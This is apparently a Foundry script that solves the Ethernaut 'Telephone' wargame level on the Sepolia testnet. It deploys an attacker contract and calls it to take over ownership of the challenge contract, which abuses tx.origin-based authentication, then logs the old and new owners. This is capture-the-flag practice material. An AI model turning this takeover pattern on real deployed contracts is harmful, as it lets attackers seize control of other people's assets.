// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked4_Telephone.sol";

//forge script  --rpc-url sepolia --account metamask  script/Cracked4_Telephone.s.sol --broadcast
contract Cracked4_TelephoneScript is Script {
    address ethernaut_contracts;
    Cracked4_Telephone telephone;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Telephone_address"));
    }
    function run() public {
        vm.startBroadcast();
        telephone = new Cracked4_Telephone(ethernaut_contracts);
        address oldOwner = ITelephone(ethernaut_contracts).owner();
        console.log("oldOwner is", oldOwner);
        console.log("tx.origin is", tx.origin);

        telephone.attach(vm.parseAddress(vm.envString("player")));

        address newOwner = ITelephone(ethernaut_contracts).owner();
        require(newOwner == vm.parseAddress(vm.envString("player")), "guess fail");
        console.log("newOwner is", newOwner);

        vm.stopBroadcast();
    }
}
